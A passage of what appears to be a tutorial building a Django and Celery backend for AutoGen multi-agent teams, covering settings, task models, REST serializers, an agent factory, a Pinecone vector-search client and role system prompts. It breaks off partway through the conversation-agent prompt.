│   │   └── prompt_templates.py
│   └── views.py
└── templates/
    └── index.html
```

Now, let's implement the core components:

```python
# project/settings.py
import os
from pathlib import Path

# Build paths inside the project like this: BASE_DIR / 'subdir'.
BASE_DIR = Path(__file__).resolve().parent.parent

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY', 'django-insecure-key-for-dev')

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = os.environ.get('DJANGO_DEBUG', 'False') == 'True'

ALLOWED_HOSTS = os.environ.get('DJANGO_ALLOWED_HOSTS', 'localhost,127.0.0.1').split(',')

# Application definition
INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'rest_framework',
    'django_celery_results',
    'django_celery_beat',
    'agent_app',
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'project.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [BASE_DIR / 'templates'],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'project.wsgi.application'

# Database
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME': os.environ.get('POSTGRES_DB', 'agent_db'),
        'USER': os.environ.get('POSTGRES_USER', 'postgres'),
        'PASSWORD': os.environ.get('POSTGRES_PASSWORD', 'postgres'),
        'HOST': os.environ.get('POSTGRES_HOST', 'localhost'),
        'PORT': os.environ.get('POSTGRES_PORT', '5432'),
    }
}

# Internationalization
LANGUAGE_CODE = 'en-us'
TIME_ZONE = 'UTC'
USE_I18N = True
USE_TZ = True

# Static files (CSS, JavaScript, Images)
STATIC_URL = 'static/'
STATIC_ROOT = BASE_DIR / 'static'

# Default primary key field type
DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'

# Celery settings
CELERY_BROKER_URL = os.environ.get('CELERY_BROKER_URL', 'redis://localhost:6379/0')
CELERY_RESULT_BACKEND = 'django-db'
CELERY_CACHE_BACKEND = 'django-cache'
CELERY_ACCEPT_CONTENT = ['json']
CELERY_TASK_SERIALIZER = 'json'
CELERY_RESULT_SERIALIZER = 'json'
CELERY_TIMEZONE = TIME_ZONE
CELERY_TASK_TRACK_STARTED = True
CELERY_TASK_TIME_LIMIT = 30 * 60  # 30 minutes
CELERY_WORKER_CONCURRENCY = 8

# REST Framework settings
REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': [
        'rest_framework.authentication.SessionAuthentication',
        'rest_framework.authentication.TokenAuthentication',
    ],
    'DEFAULT_PERMISSION_CLASSES': [
        'rest_framework.permissions.IsAuthenticated',
    ],
    'DEFAULT_PAGINATION_CLASS': 'rest_framework.pagination.PageNumberPagination',
    'PAGE_SIZE': 20
}

# AI Agent settings
OPENAI_API_KEY = os.environ.get('OPENAI_API_KEY')
PINECONE_API_KEY = os.environ.get('PINECONE_API_KEY')
PINECONE_ENVIRONMENT = os.environ.get('PINECONE_ENVIRONMENT', 'us-west1-gcp')
PINECONE_INDEX_NAME = os.environ.get('PINECONE_INDEX_NAME', 'agent-knowledge')

# Logging configuration
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'verbose': {
            'format': '{levelname} {asctime} {module} {process:d} {thread:d} {message}',
            'style': '{',
        },
        'simple': {
            'format': '{levelname} {message}',
            'style': '{',
        },
    },
    'handlers': {
        'console': {
            'level': 'INFO',
            'class': 'logging.StreamHandler',
            'formatter': 'verbose',
        },
        'file': {
            'level': 'DEBUG',
            'class': 'logging.FileHandler',
            'filename': os.path.join(BASE_DIR, 'logs/django.log'),
            'formatter': 'verbose',
        },
    },
    'loggers': {
        'django': {
            'handlers': ['console', 'file'],
            'level': 'INFO',
            'propagate': True,
        },
        'agent_app': {
            'handlers': ['console', 'file'],
            'level': 'DEBUG',
            'propagate': False,
        },
    },
}

# Create logs directory if it doesn't exist
os.makedirs(os.path.join(BASE_DIR, 'logs'), exist_ok=True)
```

```python
# project/celery.py
import os
from celery import Celery

# Set the default Django settings module
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'project.settings')

# Create the Celery app
app = Celery('project')

# Using a string here means the worker doesn't have to serialize
# the configuration object to child processes.
app.config_from_object('django.conf:settings', namespace='CELERY')

# Load task modules from all registered Django app configs.
app.autodiscover_tasks()

# Configure task routes
app.conf.task_routes = {
    'agent_app.tasks.process_agent_task': {'queue': 'agent_tasks'},
    'agent_app.tasks.update_knowledge_base': {'queue': 'knowledge_tasks'},
    'agent_app.tasks.analyze_document': {'queue': 'document_tasks'},
    'agent_app.tasks.periodic_agent_check': {'queue': 'scheduled_tasks'},
}

# Configure task priorities
app.conf.task_acks_late = True
app.conf.worker_prefetch_multiplier = 1
app.conf.task_inherit_parent_priority = True

@app.task(bind=True)
def debug_task(self):
    print(f'Request: {self.request!r}')
```

```python
# project/urls.py
from django.contrib import admin
from django.urls import path, include

urlpatterns = [
    path('admin/', admin.site.urls),
    path('api/', include('agent_app.urls')),
]
```

Now let's define the agent app models:

```python
# agent_app/models.py
import uuid
from django.db import models
from django.contrib.auth.models import User
from django.utils import timezone

class AgentTask(models.Model):
    """Model for tracking agent tasks and their status."""
    STATUS_CHOICES = (
        ('pending', 'Pending'),
        ('processing', 'Processing'),
        ('completed', 'Completed'),
        ('failed', 'Failed'),
        ('canceled', 'Canceled'),
    )
    PRIORITY_CHOICES = (
        (1, 'Low'),
        (2, 'Normal'),
        (3, 'High'),
        (4, 'Urgent'),
    )
    TYPE_CHOICES = (
        ('analysis', 'Data Analysis'),
        ('research', 'Research'),
        ('document', 'Document Processing'),
        ('conversation', 'Conversation'),
        ('generation', 'Content Generation'),
        ('other', 'Other'),
    )
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='agent_tasks')
    title = models.CharField(max_length=255)
    description = models.TextField()
    task_type = models.CharField(max_length=20, choices=TYPE_CHOICES, default='other')
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    priority = models.IntegerField(choices=PRIORITY_CHOICES, default=2)
    
    input_data = models.JSONField(default=dict, blank=True)
    result_data = models.JSONField(default=dict, blank=True, null=True)
    error_message = models.TextField(blank=True, null=True)
    
    # Metadata
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    started_at = models.DateTimeField(null=True, blank=True)
    completed_at = models.DateTimeField(null=True, blank=True)
    
    # Celery task ID for tracking
    celery_task_id = models.CharField(max_length=255, blank=True, null=True)
    
    # Token usage metrics
    prompt_tokens = models.IntegerField(default=0)
    completion_tokens = models.IntegerField(default=0)
    total_tokens = models.IntegerField(default=0)
    estimated_cost = models.DecimalField(max_digits=10, decimal_places=6, default=0)
    
    class Meta:
        ordering = ['-created_at']
        indexes = [
            models.Index(fields=['user', 'status']),
            models.Index(fields=['task_type']),
            models.Index(fields=['priority']),
        ]
    
    def __str__(self):
        return f"{self.title} ({self.status})"
    
    def set_processing(self, celery_task_id=None):
        """Mark task as processing with the associated Celery task ID."""
        self.status = 'processing'
        self.started_at = timezone.now()
        if celery_task_id:
            self.celery_task_id = celery_task_id
        self.save(update_fields=['status', 'started_at', 'celery_task_id', 'updated_at'])
    
    def set_completed(self, result_data, token_usage=None):
        """Mark task as completed with results and token usage."""
        self.status = 'completed'
        self.completed_at = timezone.now()
        self.result_data = result_data
        
        if token_usage:
            self.prompt_tokens = token_usage.get('prompt_tokens', 0)
            self.completion_tokens = token_usage.get('completion_tokens', 0)
            self.total_tokens = token_usage.get('total_tokens', 0)
            # Calculate estimated cost
            prompt_cost = self.prompt_tokens * 0.0000015  # $0.0015 per 1000 tokens
            completion_cost = self.completion_tokens * 0.000002  # $0.002 per 1000 tokens
            self.estimated_cost = prompt_cost + completion_cost
            
        self.save()
    
    def set_failed(self, error_message):
        """Mark task as failed with error message."""
        self.status = 'failed'
        self.error_message = error_message
        self.completed_at = timezone.now()
        self.save(update_fields=['status', 'error_message', 'completed_at', 'updated_at'])

class KnowledgeItem(models.Model):
    """Model for storing knowledge items for agent context."""
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='knowledge_items')
    title = models.CharField(max_length=255)
    content = models.TextField()
    
    # Metadata for filtering and organization
    source = models.CharField(max_length=255, blank=True)
    domain = models.CharField(max_length=100, blank=True)
    tags = models.JSONField(default=list, blank=True)
    
    # Vector storage tracking
    vector_id = models.CharField(max_length=255, blank=True, null=True)
    embedding_model = models.CharField(max_length=100, default="text-embedding-ada-002")
    last_updated = models.DateTimeField(auto_now=True)
    
    # Quality metrics
    relevance_score = models.FloatField(default=0.0)
    confidence = models.FloatField(default=1.0)
    
    created_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        ordering = ['-created_at']
        indexes = [
            models.Index(fields=['user', 'domain']),
            models.Index(fields=['vector_id']),
        ]
    
    def __str__(self):
        return self.title

class Conversation(models.Model):
    """Model for tracking conversations between users and agents."""
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='conversations')
    title = models.CharField(max_length=255, blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    is_active = models.BooleanField(default=True)
    
    # Metadata
    topic = models.CharField(max_length=100, blank=True)
    summary = models.TextField(blank=True)
    
    class Meta:
        ordering = ['-updated_at']
    
    def __str__(self):
        return self.title or f"Conversation {self.id}"

class Message(models.Model):
    """Model for storing messages within a conversation."""
    ROLE_CHOICES = (
        ('user', 'User'),
        ('assistant', 'Assistant'),
        ('system', 'System'),
    )
    
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    conversation = models.ForeignKey(Conversation, on_delete=models.CASCADE, related_name='messages')
    role = models.CharField(max_length=10, choices=ROLE_CHOICES)
    content = models.TextField()
    created_at = models.DateTimeField(auto_now_add=True)
    
    # Metadata
    token_count = models.IntegerField(default=0)
    
    # References to agents if applicable
    agent_name = models.CharField(max_length=100, blank=True, null=True)
    
    class Meta:
        ordering = ['created_at']
    
    def __str__(self):
        return f"{self.role} message in {self.conversation}"
```

Now let's implement the serializers for our API:

```python
# agent_app/serializers.py
from rest_framework import serializers
from .models import AgentTask, KnowledgeItem, Conversation, Message
from django.contrib.auth.models import User

class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['id', 'username', 'email', 'first_name', 'last_name']

class AgentTaskSerializer(serializers.ModelSerializer):
    user = UserSerializer(read_only=True)
    duration = serializers.SerializerMethodField()
    
    class Meta:
        model = AgentTask
        fields = [
            'id', 'user', 'title', 'description', 'task_type', 'status',
            'priority', 'input_data', 'result_data', 'error_message',
            'created_at', 'updated_at', 'started_at', 'completed_at',
            'prompt_tokens', 'completion_tokens', 'total_tokens',
            'estimated_cost', 'duration'
        ]
        read_only_fields = [
            'id', 'status', 'result_data', 'error_message', 'created_at',
            'updated_at', 'started_at', 'completed_at', 'prompt_tokens',
            'completion_tokens', 'total_tokens', 'estimated_cost'
        ]
    
    def get_duration(self, obj):
        """Calculate task duration in seconds if available."""
        if obj.started_at and obj.completed_at:
            return (obj.completed_at - obj.started_at).total_seconds()
        return None
    
    def create(self, validated_data):
        """Create a new agent task associated with the current user."""
        user = self.context['request'].user
        validated_data['user'] = user
        return super().create(validated_data)

class KnowledgeItemSerializer(serializers.ModelSerializer):
    user = UserSerializer(read_only=True)
    
    class Meta:
        model = KnowledgeItem
        fields = [
            'id', 'user', 'title', 'content', 'source', 'domain',
            'tags', 'vector_id', 'embedding_model', 'last_updated',
            'relevance_score', 'confidence', 'created_at'
        ]
        read_only_fields = [
            'id', 'vector_id', 'embedding_model', 'last_updated',
            'created_at'
        ]
    
    def create(self, validated_data):
        """Create a new knowledge item associated with the current user."""
        user = self.context['request'].user
        validated_data['user'] = user
        return super().create(validated_data)

class MessageSerializer(serializers.ModelSerializer):
    class Meta:
        model = Message
        fields = [
            'id', 'conversation', 'role', 'content', 'created_at',
            'token_count', 'agent_name'
        ]
        read_only_fields = ['id', 'created_at', 'token_count']

class ConversationSerializer(serializers.ModelSerializer):
    user = UserSerializer(read_only=True)
    messages = MessageSerializer(many=True, read_only=True)
    message_count = serializers.SerializerMethodField()
    
    class Meta:
        model = Conversation
        fields = [
            'id', 'user', 'title', 'created_at', 'updated_at',
            'is_active', 'topic', 'summary', 'messages', 'message_count'
        ]
        read_only_fields = ['id', 'created_at', 'updated_at']
    
    def get_message_count(self, obj):
        return obj.messages.count()
    
    def create(self, validated_data):
        """Create a new conversation associated with the current user."""
        user = self.context['request'].user
        validated_data['user'] = user
        return super().create(validated_data)

class ConversationMessageSerializer(serializers.Serializer):
    """Serializer for adding a message to a conversation."""
    content = serializers.CharField(required=True)
    role = serializers.ChoiceField(choices=['user', 'system'], default='user')
```

Next, let's implement the agent utilities:

```python
# agent_app/utils/agent_factory.py
import os
import autogen
import logging
from django.conf import settings
from .pinecone_client import PineconeClient
from .prompt_templates import get_system_prompt

logger = logging.getLogger('agent_app')

class AgentFactory:
    """Factory class for creating different types of agents."""
    
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.pinecone_client = PineconeClient()
    
    def get_config_list(self, model="gpt-4"):
        """Get LLM configuration list."""
        return [
            {
                "model": model,
                "api_key": settings.OPENAI_API_KEY
            }
        ]
    
    def create_agent(self, agent_type, context=None):
        """Create an agent based on the specified type."""
        if agent_type == "researcher":
            return self._create_researcher_agent(context)
        elif agent_type == "analyst":
            return self._create_analyst_agent(context)
        elif agent_type == "document_processor":
            return self._create_document_processor_agent(context)
        elif agent_type == "conversation":
            return self._create_conversation_agent(context)
        else:
            # Default to a generic assistant agent
            return self._create_generic_agent(context)
    
    def create_agent_team(self, task_data):
        """Create a team of agents for complex tasks."""
        task_type = task_data.get('task_type')
        
        if task_type == 'research':
            return self._create_research_team(task_data)
        elif task_type == 'analysis':
            return self._create_analysis_team(task_data)
        else:
            # Default team configuration
            return self._create_default_team(task_data)
    
    def _create_researcher_agent(self, context=None):
        """Create a researcher agent specialized in information gathering."""
        system_message = get_system_prompt("researcher")
        
        if context:
            domain = context.get('domain', '')
            if domain:
                system_message += f"\nYou are specialized in researching {domain}."
        
        # Define research-specific functions
        functions = [
            {
                "name": "search_knowledge_base",
                "description": "Search the knowledge base for relevant information",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "query": {"type": "string", "description": "The search query"},
                        "domain": {"type": "string", "description": "Optional domain to filter results"},
                        "limit": {"type": "integer", "description": "Maximum number of results to return"}
                    },
                    "required": ["query"]
                }
            },
            {
                "name": "summarize_sources",
                "description": "Summarize information from multiple sources",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "sources": {"type": "array", "items": {"type": "string"}, "description": "List of source texts to summarize"},
                        "max_length": {"type": "integer", "description": "Maximum length of the summary"}
                    },
                    "required": ["sources"]
                }
            }
        ]
        
        # Create the agent with appropriate configuration
        agent = autogen.AssistantAgent(
            name="ResearchAgent",
            system_message=system_message,
            llm_config={
                "config_list": self.get_config_list(),
                "functions": functions,
                "temperature": 0.5,
                "timeout": 600,  # 10 minutes timeout for research tasks
                "cache_seed": None  # No caching for research tasks
            }
        )
        
        return agent
    
    def _create_analyst_agent(self, context=None):
        """Create an analyst agent specialized in data interpretation."""
        system_message = get_system_prompt("analyst")
        
        if context:
            data_type = context.get('data_type', '')
            if data_type:
                system_message += f"\nYou are specialized in analyzing {data_type} data."
        
        # Define analysis-specific functions
        functions = [
            {
                "name": "analyze_data",
                "description": "Analyze data and provide insights",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "data": {"type": "object", "description": "The data to analyze"},
                        "metrics": {"type": "array", "items": {"type": "string"}, "description": "Metrics to calculate"},
                        "visualization": {"type": "boolean", "description": "Whether to suggest visualizations"}
                    },
                    "required": ["data"]
                }
            },
            {
                "name": "generate_report",
                "description": "Generate a structured report from analysis",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "analysis_results": {"type": "object", "description": "Results from data analysis"},
                        "format": {"type": "string", "description": "Report format (e.g., executive, technical)"},
                        "sections": {"type": "array", "items": {"type": "string"}, "description": "Sections to include in the report"}
                    },
                    "required": ["analysis_results"]
                }
            }
        ]
        
        # Create the agent with appropriate configuration
        agent = autogen.AssistantAgent(
            name="AnalystAgent",
            system_message=system_message,
            llm_config={
                "config_list": self.get_config_list("gpt-4"),  # Use GPT-4 for analysis
                "functions": functions,
                "temperature": 0.3,  # Lower temperature for more precise analysis
                "timeout": 900,  # 15 minutes timeout for analysis tasks
                "cache_seed": None  # No caching for analysis tasks
            }
        )
        
        return agent
    
    def _create_document_processor_agent(self, context=None):
        """Create an agent specialized in document processing."""
        system_message = get_system_prompt("document_processor")
        
        if context:
            doc_type = context.get('document_type', '')
            if doc_type:
                system_message += f"\nYou are specialized in processing {doc_type} documents."
        
        # Define document processing functions
        functions = [
            {
                "name": "extract_entities",
                "description": "Extract named entities from text",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "text": {"type": "string", "description": "The text to analyze"},
                        "entity_types": {"type": "array", "items": {"type": "string"}, "description": "Types of entities to extract"}
                    },
                    "required": ["text"]
                }
            },
            {
                "name": "classify_document",
                "description": "Classify document by type and content",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "text": {"type": "string", "description": "The document text"},
                        "categories": {"type": "array", "items": {"type": "string"}, "description": "Possible categories"}
                    },
                    "required": ["text"]
                }
            },
            {
                "name": "summarize_document",
                "description": "Create a concise summary of a document",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "text": {"type": "string", "description": "The document text"},
                        "max_length": {"type": "integer", "description": "Maximum summary length"}
                    },
                    "required": ["text"]
                }
            }
        ]
        
        # Create the agent with appropriate configuration
        agent = autogen.AssistantAgent(
            name="DocumentAgent",
            system_message=system_message,
            llm_config={
                "config_list": self.get_config_list(),
                "functions": functions,
                "temperature": 0.2,  # Lower temperature for precision
                "timeout": 300,  # 5 minutes timeout
                "cache_seed": 42  # Use caching for document tasks
            }
        )
        
        return agent
    
    def _create_conversation_agent(self, context=None):
        """Create an agent for interactive conversations."""
        system_message = get_system_prompt("conversation")
        
        if context:
            tone = context.get('tone', '')
            topic = context.get('topic', '')
            if tone:
                system_message += f"\nMaintain a {tone} tone in your responses."
            if topic:
                system_message += f"\nYou are specialized in discussing {topic}."
        
        # Create the agent with conversation-appropriate configuration
        agent = autogen.AssistantAgent(
            name="ConversationAgent",
            system_message=system_message,
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.7,  # Higher temperature for more creative conversations
                "timeout": 120,  # 2 minutes timeout for conversational responses
                "cache_seed": None  # No caching for unique conversations
            }
        )
        
        return agent
    
    def _create_generic_agent(self, context=None):
        """Create a general-purpose assistant agent."""
        system_message = get_system_prompt("generic")
        
        # Create a versatile, general-purpose agent
        agent = autogen.AssistantAgent(
            name="AssistantAgent",
            system_message=system_message,
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.5,
                "timeout": 180,  # 3 minutes timeout
                "cache_seed": None  # No caching
            }
        )
        
        return agent
    
    def _create_research_team(self, task_data):
        """Create a team of agents for research tasks."""
        # Create specialized agents for the research team
        researcher = self._create_researcher_agent({"domain": task_data.get("domain")})
        analyst = self._create_analyst_agent({"data_type": "research findings"})
        writer = autogen.AssistantAgent(
            name="WriterAgent",
            system_message=get_system_prompt("writer"),
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.7,
                "timeout": 300
            }
        )
        
        # Create a user proxy that will coordinate the team
        user_proxy = autogen.UserProxyAgent(
            name="ResearchCoordinator",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=10,
            code_execution_config={"work_dir": "research_workspace"}
        )
        
        # Create a group chat for the research team
        groupchat = autogen.GroupChat(
            agents=[user_proxy, researcher, analyst, writer],
            messages=[],
            max_round=15
        )
        
        manager = autogen.GroupChatManager(
            groupchat=groupchat,
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.2
            }
        )
        
        return {
            "user_proxy": user_proxy,
            "manager": manager,
            "agents": [researcher, analyst, writer],
            "groupchat": groupchat
        }
    
    def _create_analysis_team(self, task_data):
        """Create a team of agents for data analysis tasks."""
        # Create specialized agents for the analysis team
        data_processor = autogen.AssistantAgent(
            name="DataProcessor",
            system_message=get_system_prompt("data_processor"),
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.2,
                "timeout": 300
            }
        )
        
        analyst = self._create_analyst_agent({"data_type": task_data.get("data_type", "general")})
        
        visualization_expert = autogen.AssistantAgent(
            name="VisualizationExpert",
            system_message=get_system_prompt("visualization"),
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.4,
                "timeout": 300
            }
        )
        
        report_writer = autogen.AssistantAgent(
            name="ReportWriter",
            system_message=get_system_prompt("report_writer"),
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.6,
                "timeout": 300
            }
        )
        
        # Create a user proxy that will coordinate the team
        user_proxy = autogen.UserProxyAgent(
            name="AnalysisCoordinator",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=10,
            code_execution_config={"work_dir": "analysis_workspace"}
        )
        
        # Create a group chat for the analysis team
        groupchat = autogen.GroupChat(
            agents=[user_proxy, data_processor, analyst, visualization_expert, report_writer],
            messages=[],
            max_round=15
        )
        
        manager = autogen.GroupChatManager(
            groupchat=groupchat,
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.2
            }
        )
        
        return {
            "user_proxy": user_proxy,
            "manager": manager,
            "agents": [data_processor, analyst, visualization_expert, report_writer],
            "groupchat": groupchat
        }
    
    def _create_default_team(self, task_data):
        """Create a default team of agents for general tasks."""
        # Create generic agents for a default team
        planner = autogen.AssistantAgent(
            name="PlannerAgent",
            system_message=get_system_prompt("planner"),
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.3,
                "timeout": 300
            }
        )
        
        executor = autogen.AssistantAgent(
            name="ExecutorAgent",
            system_message=get_system_prompt("executor"),
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.5,
                "timeout": 300
            }
        )
        
        reviewer = autogen.AssistantAgent(
            name="ReviewerAgent",
            system_message=get_system_prompt("reviewer"),
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.2,
                "timeout": 300
            }
        )
        
        # Create a user proxy that will coordinate the team
        user_proxy = autogen.UserProxyAgent(
            name="TaskCoordinator",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=10,
            code_execution_config={"work_dir": "task_workspace"}
        )
        
        # Create a group chat for the default team
        groupchat = autogen.GroupChat(
            agents=[user_proxy, planner, executor, reviewer],
            messages=[],
            max_round=10
        )
        
        manager = autogen.GroupChatManager(
            groupchat=groupchat,
            llm_config={
                "config_list": self.get_config_list(),
                "temperature": 0.3
            }
        )
        
        return {
            "user_proxy": user_proxy,
            "manager": manager,
            "agents": [planner, executor, reviewer],
            "groupchat": groupchat
        }
```

```python
# agent_app/utils/pinecone_client.py
import os
import pinecone
import openai
import numpy as np
import time
import logging
from django.conf import settings

logger = logging.getLogger('agent_app')

class PineconeClient:
    """Client for interacting with Pinecone vector database."""
    
    def __init__(self):
        self.api_key = settings.PINECONE_API_KEY
        self.environment = settings.PINECONE_ENVIRONMENT
        self.index_name = settings.PINECONE_INDEX_NAME
        self.dimension = 1536  # OpenAI embedding dimension
        self.initialize_pinecone()
    
    def initialize_pinecone(self):
        """Initialize Pinecone and ensure index exists."""
        try:
            pinecone.init(api_key=self.api_key, environment=self.environment)
            
            # Check if index exists, if not create it
            if self.index_name not in pinecone.list_indexes():
                logger.info(f"Creating Pinecone index: {self.index_name}")
                pinecone.create_index(
                    name=self.index_name,
                    dimension=self.dimension,
                    metric="cosine",
                    shards=1
                )
                # Wait for index to be ready
                time.sleep(10)
            
            self.index = pinecone.Index(self.index_name)
            logger.info(f"Connected to Pinecone index: {self.index_name}")
            
        except Exception as e:
            logger.error(f"Error initializing Pinecone: {str(e)}")
            raise
    
    def get_embedding(self, text):
        """Get embedding for text using OpenAI API."""
        try:
            response = openai.Embedding.create(
                input=text,
                model="text-embedding-ada-002"
            )
            return response["data"][0]["embedding"]
        except Exception as e:
            logger.error(f"Error generating embedding: {str(e)}")
            raise
    
    def add_item(self, item_id, text, metadata=None):
        """Add an item to the vector database."""
        try:
            # Get text embedding
            embedding = self.get_embedding(text)
            
            # Prepare metadata
            if metadata is None:
                metadata = {}
            
            # Add text to metadata for retrieval
            metadata["text"] = text
            
            # Upsert vector to Pinecone
            self.index.upsert(
                vectors=[(item_id, embedding, metadata)]
            )
            
            logger.info(f"Added item {item_id} to Pinecone")
            return item_id
            
        except Exception as e:
            logger.error(f"Error adding item to Pinecone: {str(e)}")
            raise
    
    def delete_item(self, item_id):
        """Delete an item from the vector database."""
        try:
            self.index.delete(ids=[item_id])
            logger.info(f"Deleted item {item_id} from Pinecone")
            return True
        except Exception as e:
            logger.error(f"Error deleting item from Pinecone: {str(e)}")
            raise
    
    def search(self, query, filters=None, top_k=5):
        """Search for similar items in the vector database."""
        try:
            # Get query embedding
            query_embedding = self.get_embedding(query)
            
            # Perform vector similarity search
            results = self.index.query(
                vector=query_embedding,
                top_k=top_k,
                include_metadata=True,
                filter=filters
            )
            
            # Format results
            formatted_results = []
            for match in results.matches:
                formatted_results.append({
                    "id": match.id,
                    "score": match.score,
                    "text": match.metadata.get("text", ""),
                    "metadata": {k: v for k, v in match.metadata.items() if k != "text"}
                })
            
            return formatted_results
            
        except Exception as e:
            logger.error(f"Error searching Pinecone: {str(e)}")
            raise
    
    def update_metadata(self, item_id, metadata):
        """Update metadata for an existing item."""
        try:
            # Get current vector and metadata
            vector_data = self.index.fetch([item_id])
            
            if item_id not in vector_data.vectors:
                logger.error(f"Item {item_id} not found in Pinecone")
                return False
            
            # Extract the vector and current metadata
            current_vector = vector_data.vectors[item_id].values
            current_metadata = vector_data.vectors[item_id].metadata
            
            # Update metadata
            updated_metadata = {**current_metadata, **metadata}
            
            # Upsert with updated metadata
            self.index.upsert(
                vectors=[(item_id, current_vector, updated_metadata)]
            )
            
            logger.info(f"Updated metadata for item {item_id}")
            return True
            
        except Exception as e:
            logger.error(f"Error updating metadata in Pinecone: {str(e)}")
            raise
    
    def get_stats(self):
        """Get statistics about the index."""
        try:
            stats = self.index.describe_index_stats()
            return {
                "namespaces": stats.get("namespaces", {}),
                "dimension": stats.get("dimension"),
                "total_vector_count": stats.get("total_vector_count")
            }
        except Exception as e:
            logger.error(f"Error getting Pinecone stats: {str(e)}")
            raise
```

```python
# agent_app/utils/prompt_templates.py
"""
Prompt templates for various agent types.
"""

def get_system_prompt(agent_type):
    """
    Get the system prompt for a specific agent type.
    
    Args:
        agent_type (str): The type of agent
        
    Returns:
        str: The system prompt
    """
    prompts = {
        "researcher": """You are an expert research agent who specializes in gathering comprehensive information on any topic. Your strength is in finding relevant information, evaluating sources, and synthesizing findings.

Your capabilities:
1. Conduct thorough research on any given topic
2. Evaluate the credibility and relevance of sources
3. Identify key information and insights
4. Synthesize findings into clear, structured formats
5. Properly cite and attribute information to sources
6. Identify gaps in available information

When researching:
- Always begin by assessing what specific information is needed
- Consider multiple perspectives and sources
- Remain objective and unbiased
- Distinguish between facts, expert opinions, and uncertain claims
- Structure your findings in a logical manner
- Note limitations in available information

Your goal is to provide the most accurate, comprehensive, and well-organized research possible.""",

        "analyst": """You are an expert data analyst agent who excels at interpreting and deriving insights from complex data. Your strength is in statistical analysis, pattern recognition, and communicating findings clearly.

Your capabilities:
1. Analyze numerical and categorical data
2. Identify trends, patterns, and anomalies
3. Apply appropriate statistical methods to datasets
4. Generate actionable insights from analysis
5. Create clear interpretations of analytical results
6. Make data-driven recommendations

When analyzing:
- First understand the context and objectives of the analysis
- Consider what methods are most appropriate for the data type
- Identify key metrics and indicators that address the objectives
- Look for correlations, trends, and outliers
- Consider statistical significance and confidence levels
- Communicate findings in clear, non-technical terms when needed
- Always disclose limitations and uncertainty in your analysis

Your goal is to transform raw data into valuable insights and recommendations.""",

        "document_processor": """You are an expert document processing agent who specializes in analyzing, summarizing, and extracting information from documents. Your strength is in understanding document structure, identifying key information, and producing accurate analyses.

Your capabilities:
1. Extract key information from documents
2. Summarize document content at different levels of detail
3. Identify main themes, arguments, and conclusions
4. Recognize document structure and organization
5. Classify documents by type, purpose, and content
6. Extract named entities and relationships

When processing documents:
- First identify the document type and purpose
- Consider the document's structure and organization
- Identify the most important sections and content
- Extract key information, claims, and evidence
- Recognize the tone, style, and intended audience
- Maintain the original meaning and context
- Be precise in your extraction and summarization

Your goal is to accurately process documents and make their information accessible and useful.""",

        "conversation": """You are an expert conversation agent who excels at engaging in natural, helpful dialogue. Your strength is in understanding user needs, providing relevant information, and maintaining engaging interactions.

Your capabilities:
1. Engage in natural, flowing conversation
2. Understand explicit and implicit user questions
3. Provide clear, concise, and accurate information
4. Adapt your tone and style to match the user
5. Ask clarifying questions when needed
6. Remember context throughout a conversation

During conversations:
- Listen carefully to understand the user's full intent
- Provide helpful, relevant responses
- Be concise but complete in your answers
